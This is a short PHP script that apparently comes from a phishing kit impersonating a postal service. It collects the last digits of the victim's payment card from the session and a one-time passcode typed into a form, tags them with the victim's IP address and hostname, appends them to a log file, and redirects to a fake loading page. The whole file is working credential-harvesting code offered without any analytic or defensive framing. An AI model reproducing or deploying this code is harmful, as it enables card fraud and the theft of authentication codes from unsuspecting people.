<?php
session_start();



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
	
	

	$subject  = "POSTA [ OTP ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: posta <posta@SPYUS.ORG>\r\n";
	$message .= "bins : •••• •••• ••••".$_SESSION['scardx']."\n";
    $message .= "OTP:  ".$_POST['otp2']."\n"; 
	$message .= "IP :   $ip | $hostname\n";



	
	$Txt_Rezlt = fopen('../../sms2.txt', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);

		header('location: loading2.html');

?>



